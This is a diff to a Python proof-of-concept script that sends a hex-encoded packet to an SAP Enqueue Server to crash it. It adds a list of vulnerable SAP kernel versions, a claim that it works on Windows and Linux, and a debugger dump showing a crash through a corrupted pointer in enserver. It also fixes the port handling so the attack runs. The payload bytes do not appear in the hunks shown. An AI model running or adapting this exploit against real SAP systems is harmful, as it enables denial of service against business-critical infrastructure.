@@ -1,3 +1,39 @@
+"""
+vulnerable SAP packages 
+SAP KERNEL 7.21 32-BIT
+SAP KERNEL 7.21 32-BIT UNICODE
+SAP KERNEL 7.21 64-BIT
+SAP KERNEL 7.21 64-BIT UNICODE
+SAP KERNEL 7.21 EXT 32-BIT
+SAP KERNEL 7.21 EXT 32-BIT UC	
+SAP KERNEL 7.21 EXT 64-BIT
+SAP KERNEL 7.21 EXT 64-BIT UC	
+SAP KERNEL 7.22 64-BIT
+SAP KERNEL 7.22 64-BIT UNICODE
+SAP KERNEL 7.22 EXT 64-BIT
+SAP KERNEL 7.22 EXT 64-BIT UC
+SAP KERNEL 7.42 64-BIT
+SAP KERNEL 7.42 64-BIT UNICODE
+SAP KERNEL 7.45 64-BIT
+SAP KERNEL 7.45 64-BIT UNICODE
+SAP KERNEL 7.46 64-BIT UNICODE
+SAP KERNEL 7.47 64-BIT UNICODE
+
+Well works on Windows and Linux platforms
+
+0:009> r
+rax=00ffffffffffffff rbx=000000003ca9d9f0 rcx=000000000743f541
+rdx=0000000000000001 rsi=0000000000000003 rdi=000000003cae4300
+rip=000000013f0cdb75 rsp=000000000743f4b0 rbp=0000000000000000
+ r8=0000000000000360  r9=0000000000000000 r10=0000000000000132
+r11=000000000743f270 r12=000000000743f541 r13=000000003ca9d9f0
+r14=0000000000000000 r15=000000013f3d5d00
+iopl=0         nv up ei pl nz na po nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
+enserver!IOThread::WalkNet+0x575:
+00000001`3f0cdb75 ff10            call    qword ptr [rax] ds:00ffffff`ffffffff=????????????????
+
+"""
 import socket
 from sys import argv
 
@@ -27,7 +63,7 @@ Enqueue server connector https://github.com/CoreSecurity/pysap/blob/master/examp
         try:
             sock = socket.socket()
             print "Tried DoS to Enqueue Server"
-            sock.connect((server, port))
+            sock.connect((server, int(port)))
             sock.send(poc.decode("hex"))
             data = sock.recv(1024)
             sock.close()
